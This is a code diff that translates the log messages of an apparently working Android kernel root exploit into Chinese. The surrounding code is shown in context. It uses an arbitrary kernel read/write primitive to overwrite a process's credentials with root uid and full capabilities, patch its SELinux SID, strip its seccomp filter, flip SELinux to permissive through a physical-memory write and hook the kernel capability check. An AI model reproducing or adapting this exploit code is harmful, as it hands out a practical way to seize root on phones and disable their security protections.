@@ -208,7 +208,7 @@ int patch_cred_identity(int fd, uintptr_t cred) {
   }
   for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
     if (caps_after[i] != CAP_FULL) {
-      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
+      pr_info("root能力验证失败 cred=%016llx idx=%zu got=%016llx want=%016llx\n",
               (unsigned long long)cred, i, (unsigned long long)caps_after[i],
               (unsigned long long)CAP_FULL);
       return 0;
@@ -221,7 +221,7 @@ int patch_cred_identity(int fd, uintptr_t cred) {
 int patch_cred_sid(int fd, uintptr_t cred) {
   uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
   if (!is_direct_ptr(security)) {
-    pr_info("root bad cred security cred=%016llx security=%016llx\n",
+    pr_info("root错误的cred security cred=%016llx security=%016llx\n",
             (unsigned long long)cred, (unsigned long long)security);
     return 0;
   }
@@ -279,7 +279,7 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
   uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
   uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);
 
-  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
+  pr_info("root seccomp补丁完成 ok=%d flags=%016llx/%016llx "
           "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
           "filter=%016llx/%016llx\n",
           ok, (unsigned long long)flags_before,
@@ -298,7 +298,7 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
 int install_android_root(int fd) {
   root_uid_before = getuid();
   if (!spawn_root_child()) {
-    pr_info("root spawn failed child=%d\n", root_child_pid);
+    pr_info("root衍生失败 child=%d\n", root_child_pid);
     return 0;
   }
 
@@ -315,7 +315,7 @@ int install_android_root(int fd) {
   }
 
   if (!is_direct_ptr(init_tasks_prev)) {
-    pr_info("root bad init_tasks_prev=%016llx\n",
+    pr_info("root错误的init_tasks_prev=%016llx\n",
             (unsigned long long)init_tasks_prev);
     return 0;
   }
@@ -330,7 +330,7 @@ int install_android_root(int fd) {
   if (found_task_tgid != (uint32_t)root_child_pid) {
     current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
     if (!is_direct_ptr(current_task_addr)) {
-      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
+      pr_info("root任务遍历失败 want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
               (uint32_t)root_child_pid, task_walk_iters,
               (unsigned long long)task_walk_last_entry, task_walk_last_pid,
               task_walk_last_tgid);
@@ -363,19 +363,19 @@ int install_android_root(int fd) {
       fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_before,
       sizeof(real_caps_before));
   if (!patch_cred_object(fd, current_cred_addr)) {
-    pr_info("root patch cred failed cred=%016llx\n",
+    pr_info("root补丁cred失败 cred=%016llx\n",
             (unsigned long long)current_cred_addr);
     return 0;
   }
   if (current_real_cred_addr != current_cred_addr &&
       !patch_cred_object(fd, current_real_cred_addr)) {
-    pr_info("root patch real_cred failed real=%016llx\n",
+    pr_info("root补丁real_cred失败 real=%016llx\n",
             (unsigned long long)current_real_cred_addr);
     return 0;
   }
 
   if (!patch_task_seccomp(fd, current_task_addr)) {
-    pr_info("root patch seccomp failed task=%016llx\n",
+    pr_info("root补丁seccomp失败 task=%016llx\n",
             (unsigned long long)current_task_addr);
     return 0;
   }
@@ -399,9 +399,9 @@ int install_android_root(int fd) {
     uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
     real_cred_sid_after = pipe_read32(fd, sid_addr);
   }
-  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
+  pr_info("root cred补丁完成 uid=%u/%u sid=%u/%u\n", cred_uid_after,
           real_uid_after, cred_sid_after, real_cred_sid_after);
-  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
+  pr_info("root caps补丁完成 cred eff=%016llx/%016llx prm=%016llx/%016llx "
           "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
           (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
           (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
@@ -419,7 +419,7 @@ int install_android_root(int fd) {
     pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
   uint8_t selinux_mid = 0xff;
   pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
-  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
+  pr_info("root selinux直接写入 ok=%d %u->%u\n", selinux_direct_ok,
           selinux_before, selinux_mid);
 
   capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
@@ -431,7 +431,7 @@ int install_android_root(int fd) {
   }
   capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
   pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after));
-  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
+  pr_info("root子进程结果 done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
           "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
           "cap=%016llx/%016llx\n",
           root_child_done, root_uid_after, report.setgid_ret,
